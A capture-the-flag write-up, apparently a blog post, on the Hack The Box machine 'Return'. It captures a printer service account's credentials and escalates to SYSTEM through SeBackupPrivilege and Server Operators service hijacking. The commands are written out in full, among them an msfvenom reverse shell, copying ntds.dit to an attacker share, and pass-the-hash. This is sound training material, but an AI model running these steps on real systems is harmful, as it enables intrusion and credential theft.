---
layout: post
title: Exploring Return - Leveraging a Network Printer, Exploiting SeBackupPrivilege and Server Operator Group
date: 04/04/2024
author: Nehal Zaman
tags: ["network printer abuse", "SeBackupPrivilege abuse", "server operators group abuse"]
categories: [writeups]
render_with_liquid: false
---

![](/assets/images/writeups/return/banner.png)

# INTRODUCTION

In this journey, we'll explore [Return](https://app.hackthebox.com/machines/401). 

We start by messing with a network printer to steal its credentials and sneak into the system.

Then, we'll dive into two ways to get more power. First, we'll talk about `SeBackupPrivilege`, which lets us secretly check out any file we want. 

Next, we'll explore how to use `Server Operators` group membership to boost our control in the system.

# SCANNING

```bash
┌──(kali㉿kali)-[~/Documents/ctf/htb]
└─$ rustscan -a 10.10.11.108
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.108:53
Open 10.10.11.108:80
Open 10.10.11.108:88
Open 10.10.11.108:135
Open 10.10.11.108:139
Open 10.10.11.108:389
Open 10.10.11.108:445
Open 10.10.11.108:464
Open 10.10.11.108:3268
Open 10.10.11.108:3269
Open 10.10.11.108:5985
Open 10.10.11.108:9389
Open 10.10.11.108:47001
Open 10.10.11.108:49664
Open 10.10.11.108:49665
Open 10.10.11.108:49667
Open 10.10.11.108:49666
Open 10.10.11.108:49671
Open 10.10.11.108:49676
Open 10.10.11.108:49677
Open 10.10.11.108:49678
Open 10.10.11.108:49681
Open 10.10.11.108:49732
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-03 10:17 EDT
Initiating Ping Scan at 10:17
Scanning 10.10.11.108 [2 ports]
Completed Ping Scan at 10:17, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:17
Completed Parallel DNS resolution of 1 host. at 10:17, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:17
Scanning 10.10.11.108 [23 ports]
Discovered open port 80/tcp on 10.10.11.108
Discovered open port 135/tcp on 10.10.11.108
Discovered open port 139/tcp on 10.10.11.108
Discovered open port 445/tcp on 10.10.11.108
Discovered open port 53/tcp on 10.10.11.108
Discovered open port 49681/tcp on 10.10.11.108
Discovered open port 49732/tcp on 10.10.11.108
Discovered open port 49671/tcp on 10.10.11.108
Discovered open port 49678/tcp on 10.10.11.108
Discovered open port 3269/tcp on 10.10.11.108
Discovered open port 88/tcp on 10.10.11.108
Discovered open port 464/tcp on 10.10.11.108
Discovered open port 49676/tcp on 10.10.11.108
Discovered open port 49666/tcp on 10.10.11.108
Discovered open port 3268/tcp on 10.10.11.108
Discovered open port 49664/tcp on 10.10.11.108
Discovered open port 49665/tcp on 10.10.11.108
Discovered open port 389/tcp on 10.10.11.108
Discovered open port 9389/tcp on 10.10.11.108
Discovered open port 49677/tcp on 10.10.11.108
Discovered open port 49667/tcp on 10.10.11.108
Discovered open port 5985/tcp on 10.10.11.108
Discovered open port 47001/tcp on 10.10.11.108
Completed Connect Scan at 10:17, 1.10s elapsed (23 total ports)
Nmap scan report for 10.10.11.108
Host is up, received syn-ack (0.36s latency).
Scanned at 2024-04-03 10:17:54 EDT for 1s

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49676/tcp open  unknown          syn-ack
49677/tcp open  unknown          syn-ack
49678/tcp open  unknown          syn-ack
49681/tcp open  unknown          syn-ack
49732/tcp open  unknown          syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds
```

`Rustscan` revealed a plethora of open ports, including `53`, `80`, `88`, `135`, `139`, `389`, `445`, `464`, `3268`, `3269`, `5985`, `9389`, `47001`, `49664`, `49665`, `49666`, `49667`, `49671`, `49676`, `49677`, `49678`, `49681`, and `49732`.

```bash
┌──(kali㉿kali)-[~/Documents/ctf/htb]
└─$ nmap -sC -sV -p53,80,88,135,139,389,445,464,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49678,49681,49732 10.10.11.108
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-03 10:21 EDT
Nmap scan report for 10.10.11.108
Host is up (0.55s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-03 14:40:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49732/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 18m35s
| smb2-time: 
|   date: 2024-04-03T14:41:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.02 seconds
```

Subsequently, a deeper examination was conducted using `Nmap`. The scan confirmed the open ports and provided detailed service and version information. 

Additionally, the scan indicated the presence of an `Active Directory` (AD) environment.

# ENUMERATING RPC

```bash
┌──(kali㉿kali)-[~/Documents/ctf/htb/return]
└─$ rpcclient -U="" 10.10.11.108
Password for [WORKGROUP\]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

Attempting to access the **Remote Procedure Call** (`RPC`) interface with blank credentials proved unsuccessful. We were unable to establish a connection, encountering an error message indicating a login failure. 

At this point, we lacked valid credentials to proceed further.

# ENUMERATING SMB

```bash
┌──(kali㉿kali)-[~/Documents/ctf/htb/return]
└─$ echo exit | smbclient -L \\\\10.10.11.108
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.108 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Our attempt to explore the `SMB` shares using anonymous login returned no fruitful results. 

Although the login was successful, no available shares were detected, or we lacked the necessary permissions to access shares using anonymous credentials.

# ENUMERATING WEB

![](/assets/images/writeups/return/1.png)

The exploration of the web interface at the homepage, suggested its purpose as a printer admin panel.

![](/assets/images/writeups/return/2.png)

Upon navigating to the `settings.php` endpoint, a form was discovered, prompting users to input server details, ports, and credentials.

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/ctf/htb/return]
└─$ nc -nlvp 389                         
listening on [any] 389 ...
connect to [10.10.16.15] from (UNKNOWN) [10.10.11.108] 57960
0*`%return\svc-printer�
                       1edFg43012!!^C
```

To further investigate, a fake server was crafted by listening on port `389`, allowing the website to establish a connection. Subsequently, a string resembling a password and a system username were observed.

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/ctf/htb/return]
└─$ smbclient -L \\\\10.10.11.108 -U svc-printer   
Password for [WORKGROUP\svc-printer]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.108 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The credentials obtained appeared to be valid for the user `svc-printer`.

# SHELL AS SVC-PRINTER

If the `svc-printer` user belonged to the `Remote Management Users` group, we could leverage `winrm`, which operates on port `5985`, to attain a shell for this user.

```bash
┌──(kali㉿kali)-[~/Documents/ctf/htb]
└─$ evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

The shell was successfully obtained.

# PRIVILEGE ESCALATION PATH 1: SEBACKUPPRIVILEGE

```bash
*Evil-WinRM* PS C:\Temp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

The user `svc-printer` possessed the `SeBackupPrivilege`.

This privilege allows reading of all objects on the system, irrespective of their Access Control Lists (`ACL`). This implies access to sensitive files or the extraction of hashes from the registry, which could be exploited in `Pass-The-Hash` attacks.

```bash
*Evil-WinRM* PS C:\Temp> type C:\windows\system32\config\netlogon.dns
Access to the path 'C:\windows\system32\config\netlogon.dns' is denied.
At line:1 char:1
+ type C:\windows\system32\config\netlogon.dns
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\windows\system32\config\netlogon.dns:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

Initially, attempting to read the contents of `C:\windows\system32\config\netlogon.dns` was unsuccessful due to permission restrictions.

To overcome this, the `SeBackupPrivilege` needed to be exploited. To do so, the `SeBackupPrivilegeCmdLets.dll` and `SeBackupPrivilegeUtils.dll` from the [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) repository were imported onto the machine.

```bash
*Evil-WinRM* PS C:\Temp> copy \\10.10.16.15\tools\SeBackupPrivilege\SeBackupPrivilegeCmdLets\bin\Debug\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Temp> copy \\10.10.16.15\tools\SeBackupPrivilege\SeBackupPrivilegeCmdLets\bin\Debug\SeBackupPrivilegeUtils.dll
```

```bash
*Evil-WinRM* PS C:\Temp> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Temp> import-module .\SeBackupPrivilegeUtils.dll
```

```bash
*Evil-WinRM* PS C:\windows\system32\config> Copy-FileSeBackupPrivilege "C:\windows\system32\config\netlogon.dns" C:\Temp\netlogon.dns
*Evil-WinRM* PS C:\windows\system32\config> type C:\Temp\netlogon.dns
_ldap._tcp.return.local. 600 IN SRV 0 100 389 printer.return.local.
_ldap._tcp.Default-First-Site-Name._sites.return.local. 600 IN SRV 0 100 389 printer.return.local.
_ldap._tcp.pdc._msdcs.return.local. 600 IN SRV 0 100 389 printer.return.local.
_ldap._tcp.gc._msdcs.return.local. 600 IN SRV 0 100 3268 printer.return.local.
_ldap._tcp.Default-First-Site-Name._sites.gc._msdcs.return.local. 600 IN SRV 0 100 3268 printer.return.local.
_ldap._tcp.d3137589-2523-4e02-8c2e-98b4fa01e413.domains._msdcs.return.local. 600 IN SRV 0 100 389 printer.return.local.
c2a9b7bb-a190-4065-b4d6-f373b72005f0._msdcs.return.local. 600 IN CNAME printer.return.local.
_kerberos._tcp.dc._msdcs.return.local. 600 IN SRV 0 100 88 printer.return.local.
_kerberos._tcp.Default-First-Site-Name._sites.dc._msdcs.return.local. 600 IN SRV 0 100 88 printer.return.local.
_ldap._tcp.dc._msdcs.return.local. 600 IN SRV 0 100 389 printer.return.local.
_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.return.local. 600 IN SRV 0 100 389 printer.return.local.
_kerberos._tcp.return.local. 600 IN SRV 0 100 88 printer.return.local.
_kerberos._tcp.Default-First-Site-Name._sites.return.local. 600 IN SRV 0 100 88 printer.return.local.
_gc._tcp.return.local. 600 IN SRV 0 100 3268 printer.return.local.
_gc._tcp.Default-First-Site-Name._sites.return.local. 600 IN SRV 0 100 3268 printer.return.local.
_kerberos._udp.return.local. 600 IN SRV 0 100 88 printer.return.local.
_kpasswd._tcp.return.local. 600 IN SRV 0 100 464 printer.return.local.
_kpasswd._udp.return.local. 600 IN SRV 0 100 464 printer.return.local.
_ldap._tcp.DomainDnsZones.return.local. 600 IN SRV 0 100 389 printer.return.local.
_ldap._tcp.Default-First-Site-Name._sites.DomainDnsZones.return.local. 600 IN SRV 0 100 389 printer.return.local.
_ldap._tcp.ForestDnsZones.return.local. 600 IN SRV 0 100 389 printer.return.local.
_ldap._tcp.Default-First-Site-Name._sites.ForestDnsZones.return.local. 600 IN SRV 0 100 389 printer.return.local.
return.local. 600 IN A 10.10.11.108
gc._msdcs.return.local. 600 IN A 10.10.11.108
DomainDnsZones.return.local. 600 IN A 10.10.11.108
ForestDnsZones.return.local. 600 IN A 10.10.11.108
return.local. 600 IN AAAA dead:beef::76
return.local. 600 IN AAAA dead:beef::7198:339e:f5c0:4190
gc._msdcs.return.local. 600 IN AAAA dead:beef::76
gc._msdcs.return.local. 600 IN AAAA dead:beef::7198:339e:f5c0:4190
DomainDnsZones.return.local. 600 IN AAAA dead:beef::76
DomainDnsZones.return.local. 600 IN AAAA dead:beef::7198:339e:f5c0:4190
ForestDnsZones.return.local. 600 IN AAAA dead:beef::76
ForestDnsZones.return.local. 600 IN AAAA dead:beef::7198:339e:f5c0:4190
```

The `Copy-FileSeBackupPrivilege` command was utilized to copy `netlogon.dns` to a writable directory, enabling its contents to be read.

```bash
*Evil-WinRM* PS C:\windows\system32\config> Copy-FileSeBackupPrivilege "C:\Users\Administrator\Desktop\root.txt" C:\Temp\root.txt
*Evil-WinRM* PS C:\windows\system32\config> more C:\Temp\root.txt
30563eebb514e4677ec40d5e83d83e7d
```

This technique could also be employed to access the root flag.

```bash
*Evil-WinRM* PS C:\windows\system32\config> Copy-FileSeBackupPrivilege "C:\Windows\ntds\ntds.dit" C:\Temp\ntds.dit
Opening input file. - The process cannot access the file because it is being used by another process. (Exception from HRESULT: 0x80070020)
At line:1 char:1
+ Copy-FileSeBackupPrivilege "C:\Windows\ntds\ntds.dit" C:\Temp\ntds.di ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception
    + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege
*Evil-WinRM* PS C:\windows\system32\config> 
```

However, accessing `ntds.dit` was not possible due to it being used by another process.

To work around this, the `diskshadow` utility could be used to copy the `C` volume, allowing access to `ntds.dit` from the newly created volume.

For a `DSH` script for `diskshadow` utility, an example script could be:

```bash
set context persistent nowriters
set metadata c:\Temp\nehal.cab
set verbose on
add volume c: alias nehal
create
expose %nehal% z:
```

If the script is created in `Kali`, `unix2dos` must be run on it to make it DOS compatible.

The subsequent steps involve running `diskshadow`, copying the `SYSTEM` file and `ntds.dit` from the new volume, and using `secretsdump.py` to obtain the `NTLM` hash of `administrator`, which can then be used in `evil-winrm`.

```bash
diskshadow /s c:\Temp\vss.dsh
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.16.15\s\ntds.dit
reg.exe save hklm\system \\10.10.16.15\system
secretsdump.py -system system -ntds ntds.dit LOCAL
evil-winrm -i 10.10.11.108 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
```

However, the `diskshadow` technique did not work on the machine for some reason. This method serves as an illustration of how `SeBackupPrivilege` can be exploited to potentially gain shell access.

# PRIVILEGE ESCALATION PART 2: SERVER OPERATORS GROUP

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2021 1:39:29 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

From the output, we observed that the user `svc-printer` is a member of the `Server Operators` group.

Being part of the `Server Operators` group is not inherently a vulnerability, but it grants special privileges to make changes on the domain, potentially allowing an attacker to escalate privileges to system level.

```bash
*Evil-WinRM* PS C:\Temo> services

Path                                                                                                                
----                                                                                                                
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                           
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                       
C:\Windows\SysWow64\perfhost.exe                                                                                    
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                          
C:\Windows\servicing\TrustedInstaller.exe                                                                           
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                              
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                 
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                      
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                     
"C:\Program Files\Windows Media Player\wmpnetwk.exe"
```

We listed the services running on the server by executing the `services` command, observing the list of services. We noted the service name `VMTools` and its binary path for potential lateral movement.

```bash
┌──(kali㉿kali)-[~/Documents/Windows-exploitation]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.15 LPORT=1337 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```

```bash
*Evil-WinRM* PS C:\Temo> copy \\10.10.16.15\tools\reverse.exe
```

We crafted a reverse shell payload that would connect back to port `1337`, saved it as `reverse.exe`, and then copied it to the victim machine.

```bash
*Evil-WinRM* PS C:\Temo> sc.exe config VMTools binPath= "C:\Temo\reverse.exe"
[SC] ChangeServiceConfig SUCCESS
```

Subsequently, we set the `binPath` of the `VMTools` service to the path of the reverse shell payload that we copied earlier.

```bash
*Evil-WinRM* PS C:\Temo> sc.exe stop VMTools

SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

```bash
*Evil-WinRM* PS C:\Temo> sc.exe start VMTools
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

Next, we attempted to restart the `VMTools` service.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.16.15] from (UNKNOWN) [10.10.11.108] 51302
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

Upon successfully restarting the service, we received a reverse shell back as `administrator`. This exploit essentially leverages an insecure service permission misconfiguration to escalate privileges.

# CONCLUSION

In conclusion, we successfully exploited multiple vulnerabilities to gain privileged access to the target system. 

Initially, we leveraged network printer credentials to gain entry. 

Then, we utilized the `SeBackupPrivilege` to read any file on the system, granting us significant access. 

Finally, by exploiting the `Server Operators` group, we escalated privileges and obtained a shell as the administrator. 

These exploits highlight the importance of securing credentials and managing user groups effectively to prevent unauthorized access and privilege escalation.

Thank you for coming this far, and see you again soon for more exploitation. Until next time!